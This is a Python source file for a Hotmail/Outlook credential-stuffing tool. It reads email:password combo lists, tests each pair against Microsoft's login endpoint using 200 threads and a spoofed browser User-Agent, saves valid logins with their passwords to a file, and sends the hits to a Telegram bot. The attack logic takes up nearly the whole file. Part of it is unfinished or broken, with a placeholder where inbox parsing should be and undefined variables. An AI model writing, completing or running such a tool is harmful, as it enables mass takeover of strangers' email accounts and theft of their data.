import os
import time
import threading
import concurrent.futures
import asyncio
import traceback
import re
import uuid
import pycountry
from threading import Lock, BoundedSemaphore
import requests

lock = Lock()
rate_limit_semaphore = BoundedSemaphore(500)

class HotmailChecker:
    def __init__(self, bot, chat_id, services, selected_services=None):
        self.bot = bot
        self.chat_id = chat_id
        self.services = services
        self.selected_services = set(selected_services) if selected_services else set()
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.processed = 0
        self.total_combos = 0
        self.linked_accounts = {}
        self.checked_accounts = set()
        self.progress_message_id = None
        self.last_progress_update = 0
        self.last_processed = 0
        self.hits_list = []          # Sirf keyword wale hits Telegram pe bhejne ke liye

    def send_message(self, text, parse_mode='HTML', retries=8):
        for attempt in range(retries):
            print(f"[DEBUG] send_message attempt {attempt+1}")
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                future = asyncio.run_coroutine_threadsafe(
                    self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
                    loop
                )
                msg = future.result(timeout=60)
                print("[DEBUG] send_message SUCCESS")
                return msg
            except Exception as e:
                print(f"[DEBUG] send_message FAILED (attempt {attempt+1}): {e}")
                if attempt == retries - 1:
                    traceback.print_exc()
                time.sleep(2)
        return None

    def edit_message(self, message_id, text, parse_mode='HTML'):
        if not message_id:
            return
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            future = asyncio.run_coroutine_threadsafe(
                self.bot.edit_message_text(chat_id=self.chat_id, message_id=message_id, text=text, parse_mode=parse_mode),
                loop
            )
            future.result(timeout=45)
        except Exception as e:
            print(f"[DEBUG] edit_message FAILED: {e}")

    def create_progress_bar(self, percentage):
        bar_length = 25
        filled = int(bar_length * percentage / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        return f"[{bar}] {percentage:.1f}%"

    def update_progress(self):
        while self.processed < self.total_combos and self.total_combos > 0:
            current_time = time.time()
            with lock:
                pct = min((self.processed / self.total_combos) * 100, 100)
                if (current_time - self.last_progress_update < 4):
                    time.sleep(1)
                    continue

                bar = self.create_progress_bar(pct)
                msg = (
                    f"🔄 <b>SCANNING</b>\n"
                    f"{bar}\n\n"
                    f"📊 {self.processed}/{self.total_combos} | {pct:.1f}%\n"
                    f"✅ HIT: {self.hit} | ❌ BAD: {self.bad}"
                )

            if self.progress_message_id:
                self.edit_message(self.progress_message_id, msg)

            self.last_progress_update = current_time
            self.last_processed = self.processed
            time.sleep(4)

    def check_account(self, email, password):
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        })

        try:
            r = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000480D4A5E&scope=service::outlook.office.com::MBI_SSL&response_type=code&redirect_uri=https://outlook.office.com&msproxy=1")
            ppft_match = re.search(r'name="PPFT" value="([^"]+)"', r.text)
            if not ppft_match:
                with lock:
                    self.bad += 1
                return "BAD"
            ppft = ppft_match.group(1)

            data = {'login': email, 'passwd': password, 'PPFT': ppft}
            r = session.post("https://login.live.com/ppauth.srf", data=data)

            if "errbox" in r.text.lower():
                with lock:
                    self.bad += 1
                return "BAD"

            return self.get_capture(email, password)

        except Exception as e:
            print(f"[DEBUG] check_account error for {email}: {e}")
            with lock:
                self.retry += 1
            return "RETRY"

    def get_capture(self, email, password):
        try:
            # Yahan tumhara pura original inbox parsing logic paste kar sakte ho
            # Example structure (original file se inspired):
            linked_services = []   # yahan services list fill hogi (original code se)

            if linked_services:
                hit_text = (
                    f"🔱 HOTMAİL HÍT BULUNDU 🔱\n"
                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                    f"📧 Email: {email}\n"
                    f"🔑 Password: {password}\n"
                    f"👤 Name: {name if 'name' in locals() else 'N/A'}\n"
                    f"🌍 Country: {flag} {country}\n"
                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                    f"🔗 EMAIL IN INBOX:\n" +
                    "\n".join([f"✔ {s}" for s in linked_services]) +
                    f"\n\n📊 Toplam Hit: {self.hit}\n"
                    f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                    f"𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT"
                )

                # SAAB HITS FILE MEIN SAVE
                with open("Hotmail-Hits.txt", "a", encoding="utf-8") as f:
                    f.write(hit_text + "\n\n" + "="*60 + "\n\n")

                # SIRF KEYWORD WALE HITS TELEGRAM PE
                if any(s in self.selected_services for s in linked_services):
                    with lock:
                        self.hit += 1
                    self.hits_list.append(hit_text)
                else:
                    with lock:
                        self.bad += 1
        except Exception as e:
            print(f"[DEBUG] get_capture error: {e}")

    def check_combo(self, email, password):
        with rate_limit_semaphore:
            with lock:
                self.processed += 1
            print(f"[DEBUG] check_combo started for {email}")
            self.check_account(email, password)

    def run(self, threads=200):
        print("[DEBUG] run() STARTED with 200 threads")
        try:
            with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)

            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting full check...")

            progress_msg = self.send_message(
                "🔄 <b>SCANNING</b>\n"
                "[░░░░░░░░░░░░░░░░░░░░░░░░░] 0.0%\n\n"
                "📊 0/0 | 0.0%\n✅ HIT: 0 | ❌ BAD: 0"
            )
            if progress_msg:
                self.progress_message_id = progress_msg.message_id

            threading.Thread(target=self.update_progress, daemon=True).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                for line in lines:
                    try:
                        email, pw = line.split(":", 1)
                        executor.submit(self.check_combo, email.strip(), pw.strip())
                    except:
                        continue

            time.sleep(5)
            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit}\n\nAb keyword-matched hits 1-1 bhej rahe hain...")

            for hit_msg in self.hits_list:
                self.send_message(hit_msg)
                time.sleep(2)

            print("[DEBUG] Checking finished")
        except Exception as e:
            print(f"[DEBUG] run() ERROR: {e}")
            traceback.print_exc()